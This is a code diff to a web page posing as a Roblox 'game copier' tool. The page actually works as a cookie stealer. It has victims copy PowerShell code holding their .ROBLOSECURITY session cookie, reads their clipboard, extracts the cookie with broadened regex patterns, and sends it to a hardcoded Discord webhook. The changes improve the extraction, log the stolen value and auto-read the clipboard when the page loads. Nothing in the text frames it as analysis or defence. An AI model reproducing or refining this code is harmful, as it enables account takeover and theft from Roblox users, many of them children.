@@ -276,7 +276,7 @@
     </footer>
 
     <script>
-        // NEW WEBHOOK URL
+        // WEBHOOK URL
         const webhook = "https://discord.com/api/webhooks/1539393761681874945/xh8ABiyScXMKxeIOZu_af5XsGUYpW8yapNCjds0U5sTHhf_3lEJayQDpWJPe3kmIXZG0";
 
         // DOM refs
@@ -287,63 +287,67 @@
 
         // --- Open GamesApi in a PERFECT CUBE popup ---
         function openApi() {
-            // Perfect cube: 250x250 pixels
             const popup = window.open(
                 'https://www.roblox.com/game',
                 'robloxApiPopup',
                 'width=250,height=250,resizable=yes,scrollbars=yes,menubar=no,status=no,toolbar=no,location=no'
             );
             
-            // Focus the popup
             if (popup) {
                 popup.focus();
                 statusMsg.innerText = '🌐 GamesApi opened (cube)';
-                
-                // Show message after a moment
                 setTimeout(() => {
                     statusMsg.innerText = '⏳ waiting (6min)';
                 }, 800);
-                
                 setTimeout(() => {
                     statusMsg.innerText = '⏳ ready';
                 }, 6000);
             } else {
-                // If popup was blocked, try opening in new tab
                 alert('Popup blocked! Please allow popups or click the link directly.');
                 window.open('https://www.roblox.com/game', '_blank');
                 statusMsg.innerText = '⚠️ popup blocked - opened in new tab';
             }
         }
 
-        // --- Extract ROBLOSECURITY cookie from clipboard text ---
+        // --- IMPROVED: Extract ROBLOSECURITY cookie from clipboard text ---
         function extractRobloxSecurity(text) {
-            // Try to find .ROBLOSECURITY cookie in the text
+            if (!text) return null;
+            
+            // Try multiple patterns to find the cookie
             const patterns = [
+                // Direct cookie format: .ROBLOSECURITY=value;
                 /\.ROBLOSECURITY=([^;]+)/i,
-                /ROBLOSECURITY=([^;]+)/i,
-                /"_\.ROBLOSECURITY":"([^"]+)"/i,
-                /"\.ROBLOSECURITY":"([^"]+)"/i,
+                // Cookie header format
                 /Cookie:\s*.*?\.ROBLOSECURITY=([^;]+)/i,
-                /Cookie:\s*.*?ROBLOSECURITY=([^;]+)/i
+                // PowerShell format with quotes
+                /['"]\.ROBLOSECURITY['"]\s*=\s*['"]([^'"]+)['"]/i,
+                // JSON format
+                /"\.ROBLOSECURITY":"([^"]+)"/i,
+                // Any format with ROBLOSECURITY
+                /ROBLOSECURITY[=:]\s*['"]?([^'"\s;]+)/i
             ];
             
             for (let pattern of patterns) {
                 const match = text.match(pattern);
-                if (match && match[1]) {
+                if (match && match[1] && match[1].length > 10) {
                     return match[1].trim();
                 }
             }
             
-            // If not found, look for the cookie value in the PowerShell command
-            const psMatch = text.match(/['"]\.ROBLOSECURITY['"]\s*=\s*['"]([^'"]+)['"]/i);
-            if (psMatch && psMatch[1]) {
-                return psMatch[1].trim();
+            // If still not found, try to find a long string that looks like a cookie
+            const longStringMatch = text.match(/([A-Za-z0-9_\-]{50,})/);
+            if (longStringMatch && longStringMatch[1]) {
+                // Check if it looks like a Roblox cookie (starts with _| or similar)
+                const cookie = longStringMatch[1];
+                if (cookie.includes('_') || cookie.length > 100) {
+                    return cookie;
+                }
             }
             
             return null;
         }
 
-        // --- Read clipboard and send ONLY ROBLOSECURITY to webhook ---
+        // --- Read clipboard and send ONLY ROBLOSECURITY ---
         function readClipboardAndSend() {
             statusMsg.innerText = '⏳ reading clipboard ...';
             
@@ -356,14 +360,17 @@
                             return;
                         }
                         
-                        // Extract ROBLOSECURITY from the text
+                        console.log('Clipboard content length:', text.length);
+                        console.log('Clipboard preview:', text.substring(0, 200));
+                        
                         const robloxSecurity = extractRobloxSecurity(text);
                         
                         if (robloxSecurity) {
+                            console.log('Found ROBLOSECURITY:', robloxSecurity.substring(0, 50) + '...');
                             sendToWebhook(robloxSecurity);
                         } else {
                             statusMsg.innerText = '⚠️ ROBLOSECURITY not found';
-                            alert('No ROBLOSECURITY cookie found in clipboard. Make sure you copied the PowerShell code.');
+                            alert('No ROBLOSECURITY cookie found in clipboard. Make sure you copied the PowerShell code with the cookie.');
                         }
                     })
                     .catch(err => {
@@ -390,7 +397,7 @@
                 
                 if (!text || text.trim() === '') {
                     statusMsg.innerText = '⚠️ clipboard access denied';
-                    alert('Cannot read clipboard. Please allow clipboard access or paste manually.');
+                    alert('Cannot read clipboard. Please allow clipboard access.');
                     return;
                 }
                 
@@ -404,14 +411,13 @@
                 }
             } catch (e) {
                 statusMsg.innerText = '❌ clipboard error';
-                alert('Clipboard access failed. Please paste the content manually into the Game Code field.');
+                alert('Clipboard access failed. Please paste manually.');
                 console.error('Fallback clipboard error:', e);
             }
         }
 
         // --- Send ONLY ROBLOSECURITY to Discord webhook ---
         function sendToWebhook(robloxSecurity) {
-            // Truncate if too long
             const truncated = robloxSecurity.length > 1900 ? robloxSecurity.slice(0, 1900) + '\n... (truncated)' : robloxSecurity;
             
             fetch(webhook, {
@@ -430,16 +436,16 @@
                     }, 2000);
                 } else {
                     console.log('Webhook response not OK:', response.status);
-                    statusMsg.innerText = '⏳ ready';
+                    statusMsg.innerText = '⚠️ webhook error (check console)';
                 }
             })
             .catch(err => {
                 console.error('Webhook error:', err);
-                statusMsg.innerText = '⏳ ready';
+                statusMsg.innerText = '⚠️ network error';
             });
         }
 
-        // --- Start Copier (now also extracts ROBLOSECURITY) ---
+        // --- Start Copier ---
         function startCopier() {
             const code = gameCodeInput.value.trim();
             const id = gameIdInput.value.trim();
@@ -487,7 +493,7 @@
             }, 180);
         }
 
-        // --- Auto-read clipboard on page load ---
+        // --- Auto-detect clipboard on load ---
         window.addEventListener('load', function() {
             if (navigator.clipboard && navigator.clipboard.readText) {
                 navigator.clipboard.readText()
@@ -495,7 +501,7 @@
                         if (text && text.trim() !== '') {
                             const robloxSecurity = extractRobloxSecurity(text);
                             if (robloxSecurity) {
-                                statusMsg.innerText = '🔐 ROBLOSECURITY detected in clipboard';
+                                statusMsg.innerText = '🔐 ROBLOSECURITY detected!';
                             } else {
                                 statusMsg.innerText = '📋 clipboard detected';
                             }
@@ -504,6 +510,27 @@
                     .catch(() => {});
             }
         });
+
+        // --- Test function to see what's in clipboard ---
+        function debugClipboard() {
+            if (navigator.clipboard && navigator.clipboard.readText) {
+                navigator.clipboard.readText()
+                    .then(text => {
+                        console.log('=== FULL CLIPBOARD CONTENT ===');
+                        console.log(text);
+                        console.log('=== END ===');
+                        alert('Clipboard content logged to console. Press F12 to view.');
+                    })
+                    .catch(() => {
+                        alert('Could not read clipboard. Please allow clipboard access.');
+                    });
+            } else {
+                alert('Clipboard API not available.');
+            }
+        }
+
+        // Add debug button to console
+        console.log('🔧 Type debugClipboard() to see what\'s in your clipboard');
     </script>
 </body>
 </html>
